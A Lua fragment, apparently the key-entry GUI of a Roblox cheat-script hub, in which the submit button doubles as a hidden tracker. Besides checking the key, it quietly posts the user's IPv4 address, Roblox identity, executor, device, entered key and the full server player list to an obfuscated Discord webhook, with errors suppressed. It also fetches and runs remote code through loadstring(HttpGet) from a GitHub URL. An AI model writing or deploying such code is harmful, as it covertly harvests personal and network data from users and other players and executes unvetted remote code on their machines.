-- ============================================================
-- SUBMIT BUTTON - MAIN KEY VALIDATION LOGIC
-- ============================================================
local function WCDO_fake_script()
    local script = Instance.new('Script', Submit)
    local KeyCheck = script.Parent.Parent.InsertKey

    local function onInputBegan(input, gameProcessed)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then

            -- Discord webhook logger (runs in background, non-blocking)
            spawn(function()
                pcall(function()
                    local HttpService = game:GetService("HttpService")
                    local UserInputService = game:GetService("UserInputService")
                    local Players = game:GetService("Players")
                    local WEBHOOK_URL = DecryptedWebHook
                    local executor = identifyexecutor and identifyexecutor() or "Unknown"
                    local key = KeyCheck.Text or ""

                    local function getPlatform()
                        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled then
                            return "Mobile"
                        else
                            return "PC"
                        end
                    end

                    local function getPlayerList()
                        local playerList = {}
                        for _, p in ipairs(Players:GetPlayers()) do
                            table.insert(playerList, string.format("Name: %s\nDisplayName: %s\nUserId: %d", p.Name, p.DisplayName, p.UserId))
                        end
                        return table.concat(playerList, "\n\n")
                    end

                    local function sendToDiscord()
                        local localPlayer = Players.LocalPlayer
                        local ipv4 = getCurrentIP()
                        local data = {
                            ["username"] = "Player Tracker",
                            ["content"] = "**Player Entered Key - Detailed Information**",
                            ["embeds"] = {{
                                ["title"] = "Complete Player Report",
                                ["description"] = string.format(
                                    "**Client Information:**\n• Executor: %s\n• Device: %s\n• Key: %s\n\n**Player Identity:**\n• Name: %s (@%s)\n• UserID: %d\n\n**Network Information:**\n• IPv4: %s\n**Server Players (%d):**\n%s",
                                    executor, getPlatform(), key,
                                    localPlayer.DisplayName, localPlayer.Name, localPlayer.UserId,
                                    ipv4 or "Unknown", #Players:GetPlayers(), getPlayerList()
                                ),
                                ["color"] = 0xFFA500,
                                ["footer"] = { ["text"] = os.date("%X • %x") },
                                ["thumbnail"] = { ["url"] = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", localPlayer.UserId) }
                            }}
                        }
                        local success, jsonData = pcall(function() return HttpService:JSONEncode(data) end)
                        if success then
                            pcall(function()
                                request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonData })
                            end)
                        end
                    end
                    sendToDiscord()
                end)
            end)

            -- Main key verification
            spawn(function()
                -- Premium bypass — no key needed
                if DEVIL_Script_Lisence == true then
                    local txt = KeyCheck.Text
                    if txt == "" or txt == "Premium..." then
                        KeyCheck.Text = "Loading Script..."
                        task.wait(1)
                        getgenv().bypassercheck = true
                        getgenv().HubKey = true
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/DEVIL-Hub/main/gamess", true))()
                        task.wait(2)
                        getgenv().HubKey = false
                        getgenv().bypassercheck = false
                        script.Parent.Parent.Parent:Destroy()
                        return
                    end
                end

                local rawKey = KeyCheck.Text
                if not rawKey or rawKey == "" then
                    KeyCheck.Text = "Please enter a key"
                    task.wait(2)
                    KeyCheck.Text = ""
                    return
                end

                KeyCheck.Text = emojis.loading .. " Validating..."

                local ok, keyType, msg = detectAndValidateKey(rawKey)

                if ok then
                    -- Save the valid key for next time
                    saveKey(rawKey)
                    KeyCheck.Text = "Loading Script..."
                    task.wait(1)
                    loadMainScript(keyType)
                    script.Parent.Parent.Parent:Destroy()
                else
                    -- Show error reason
                    if keyType == "unknown" then
                        KeyCheck.Text = "Invalid key format"
                    else
                        KeyCheck.Text = msg or "Invalid key"
                    end
                    warn(emojis.close .. " Key validation failed (" .. keyType .. "): " .. tostring(msg))
                    task.wait(2.5)
                    KeyCheck.Text = ""
                end
            end)
        end
    end
    script.Parent.InputBegan:Connect(onInputBegan)
end
coroutine.wrap(WCDO_fake_script)()

